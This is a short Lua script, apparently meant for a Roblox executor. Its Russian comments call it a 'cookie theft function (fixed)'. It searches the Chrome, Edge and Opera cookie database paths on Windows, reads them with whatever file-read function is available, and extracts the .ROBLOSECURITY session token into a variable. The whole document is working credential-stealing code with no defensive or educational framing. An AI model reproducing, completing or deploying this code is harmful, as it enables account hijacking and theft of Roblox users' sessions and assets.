-- Функция кражи куки (исправлена)
local function getCookie()
    local cookie = nil
    
    -- Проверяем все возможные функции чтения
    local readFuncs = {readfile, _G.readfile, file_read, fs_read, loadfile}
    
    for _, func in ipairs(readFuncs) do
        if type(func) == "function" then
            local paths = {
                os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
                os.getenv("LOCALAPPDATA") .. "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
                os.getenv("APPDATA") .. "\\Opera Software\\Opera Stable\\Network\\Cookies",
            }
            
            for _, path in ipairs(paths) do
                local success, content = pcall(func, path)
                if success and content and type(content) == "string" then
                    -- Ищем куку (исправлен паттерн)
                    local match = content:match(".ROBLOSECURITY=([^;]+)")
                    if match and #match > 10 then
                        cookie = match
                        break
                    end
                end
            end
            if cookie then break end
        end
    end
    
    return cookie
end

-- Получаем куку
local cookie = getCookie()

